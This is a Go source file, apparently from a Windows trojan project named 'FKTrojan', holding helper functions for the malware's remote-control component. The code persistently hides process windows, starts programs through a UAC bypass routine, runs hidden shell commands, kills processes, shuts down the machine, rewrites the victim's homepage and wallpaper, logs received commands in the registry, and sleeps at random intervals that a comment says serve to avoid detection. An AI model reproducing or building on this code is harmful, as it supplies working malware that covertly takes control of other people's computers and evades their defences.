/*
Author: FreeKnight
各种无法分类的基本函数集
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"encoding/base64"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unicode"
	"unsafe"

	"errors"
	"io/ioutil"

	"github.com/StackExchange/wmi"
	"github.com/qiniu/log"
	"golang.org/x/sys/windows/registry"
)

//------------------------------------------------------------
// 字符串去除空格
func stripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}

//------------------------------------------------------------
// 简单的Debug日志

var (
	// 为了定位日志所在代码行，直接用log.Printf函数
	FKDebugLog = log.Printf
)

/*func FKDebugLog(message string) {
	if len(message) > 0 && isFKDebug {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format(time.RFC850), "] "+message)
	}
}*/

//------------------------------------------------------------
// 隐藏一个进程（通过标题名）
// 例如：HideProcWindow("Calculator")
func hideProcWindow(exe string, active string) (string, error) {
	isAlive, _ := checkIsProcessInWin32ProcessList(exe)
	if !isAlive {
		return "", errors.New("Process is not active. Hide failed.")
	}

	if active == "true" {
		go alwaysHideProcWindow(exe)

		return "Notice a thread to hide process successed.", nil
	} else {
		procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))

		return "Hide process successed.", nil
	}
}

//------------------------------------------------------------
// 持续进程隐藏
func alwaysHideProcWindow(exe string) {
	for {
		time.Sleep(1 * time.Second)
		b, _ := checkIsProcessInWin32ProcessList(exe)
		if b {
			procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))
		}
	}
}

//------------------------------------------------------------
// 根据标题名查找一个窗口
func findWindow(title string) syscall.Handle {
	var hwnd syscall.Handle
	cb := syscall.NewCallback(func(h syscall.Handle, p uintptr) uintptr {
		b := make([]uint16, 200)
		_, err := getWindowText(h, &b[0], int32(len(b)))
		if err != nil {
			return 1
		}
		if strings.Contains(syscall.UTF16ToString(b), title) {
			hwnd = h
			return 0
		}
		return 1
	})
	enumWindows(cb, 0)
	if hwnd == 0 {
		return 0
	}
	return hwnd
}

//------------------------------------------------------------
// 枚举窗口回调
func enumWindows(enumFunc uintptr, lparam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumWindows.Addr(), 2, uintptr(enumFunc), uintptr(lparam), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

//------------------------------------------------------------
// 检查当前进程列表，是否包含指定名字的进程
func checkIsProcessInWin32ProcessList(proc string) (bool, string) {
	var dst []Win32_Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false, ""
	}
	for _, v := range dst {
		if bytes.Contains([]byte(v.Name), []byte(proc)) {
			return true, proc
		}
	}
	return false, ""
}

//------------------------------------------------------------
// 弹出MessageBox
func messageBox(title, text string, style uintptr) (result int) {
	ret, _, _ := procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		uintptr(style))
	result = int(ret)
	return
}

//------------------------------------------------------------
// 生成随机字符串
// strlen 生成字符長度
// icint 是否包含数字
func randomString(strlen int, icint bool) string {
	if icint {
		rand.Seed(time.Now().UTC().UnixNano())
		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
		result := make([]byte, strlen)
		for i := 0; i < strlen; i++ {
			result[i] = chars[rand.Intn(len(chars))]
		}
		return string(result)
	}
	rand.Seed(time.Now().UTC().UnixNano())
	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
	result := make([]byte, strlen)
	for i := 0; i < strlen; i++ {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

//------------------------------------------------------------
// 随机整形
func randInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

//------------------------------------------------------------
// 休眠 X 秒
func goToSleep(sleeptime int) {
	time.Sleep(time.Duration(sleeptime) * time.Second)
}

//------------------------------------------------------------
// 眨眨眼吧，为避免占用太高的CPU
func takeASnap() {
	time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
}

//------------------------------------------------------------
// 咪一下，为避免占用太高的CPU
func takeAShortRest() {
	time.Sleep(time.Duration(randInt(75, 200)) * time.Millisecond)
}

//------------------------------------------------------------
// 稍微休眠会儿，为避免被检测
func takeALongRest() {
	time.Sleep(time.Duration(randInt(250, 500)) * time.Millisecond)
}

//------------------------------------------------------------
// 慢慢睡，睡到爽……一般是没啥重要的事，但是偶尔要检查下
func takeALonglongRest() {
	time.Sleep(time.Duration(randInt(2, 5)) * time.Second)
}

//------------------------------------------------------------
// 打开一个网址
func openURL(URL string, mode string) (string, error) {
	if mode == "0" {
		rsp, err := http.Get(URL)
		if err == nil {
			buf, _ := ioutil.ReadAll(rsp.Body)
			return string(buf[:]), nil
		}
		return "", err
		defer rsp.Body.Close()
	}

	err := exec.Command("cmd", "/c", "start", URL).Start()
	if err == nil {
		return "Open url" + URL + "success.", nil
	}
	return "", err
}

//------------------------------------------------------------
// 打开一个exe
func startEXE(name string, uac string) (string, error) {
	if !strings.Contains(name, ".exe") {
		return "", errors.New(name + " didn't end with EXE")
	}

	if uac == "0" {
		binary, err := exec.LookPath(name)
		if err != nil {
			return "", err
		}
		err = exec.Command(binary).Run()
		if err != nil {
			return "", err
		}
		return "Start exe " + name + "success.", nil
	} else {
		binary, err := exec.LookPath(name)
		if err != nil {
			return "", err
		}
		if uacBypass(binary) {
			return "Start exe " + name + "success.", nil
		} else {
			return "", errors.New("Start exe failed: Pass UAC failed.")
		}
	}
}

//------------------------------------------------------------
// 关闭计算机
func shutdown(mode string) (string, error) {
	if mode == "0" {
		return runThirdExe("shutdown -s -t 00")
	} else if mode == "1" {
		return runThirdExe("shutdown -r -t 00")
	} else if mode == "2" {
		return runThirdExe("shutdown -l -t 00")
	}
	return "Shutdown successed", nil
}

//------------------------------------------------------------
// 部分自定义的注册表信息
func registryLastCommand(val string) {
	// 记录上一个接受的命令
	//_ = deleteRegistryKey(registry_crypto.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")
	_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST", common.Md5Hash(val))
}

//------------------------------------------------------------
// 设置你丫的桌面背景...
func setBackground(mode string, data string) (string, error) {

	n := randomString(5, false)
	output, err := os.Create(tmpAppDataInstallDir + n + ".jpg")
	if err != nil {
		return "", err
	}
	defer output.Close()
	if mode == "0" { // 从网上下载图片
		response, err1 := http.Get(data)
		if err1 != nil {
			return "", err1
		}
		defer response.Body.Close()
		_, err = io.Copy(output, response.Body)
		if err != nil {
			return "", err
		}
	} else { // 直接参数就是图片，进行base64解密
		DecodedImage, err1 := base64.StdEncoding.DecodeString(data)
		if err1 != nil {
			return "", err1
		}
		_, err1 = output.WriteString(string(DecodedImage))
		if err != nil {
			return "", err
		}
	}

	ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpAppDataInstallDir+n+".jpg"))), 2)
	if ret == 1 {
		return "Set background successed.", nil
	}
	return "", errors.New("SystemParametersInfo failed.")
}

//------------------------------------------------------------
// 设置本地默认主页
func setHomepage(url string) (string, error) {
	err := writeRegistryKey(registry.CURRENT_USER, homepagePath, "Start Page", url)
	if err != nil {
		return "", nil
	}
	return "Set home page successed.", err
}

//------------------------------------------------------------
// 执行第三方进程
func runThirdExe(cmd string) (string, error) {
	c := exec.Command("cmd", "/C", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := c.Run()
	if err != nil {
		return "", err
	}
	return "Run exe successed", nil
}

//------------------------------------------------------------
// 销毁第三方进程
func killThirdExe(name string) (string, error) {
	c := exec.Command("cmd", "/C", "taskkill /F /IM "+name)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := c.Run()
	if err != nil {
		return "", err
	}
	return "Kill exe successed", nil
}

//------------------------------------------------------------
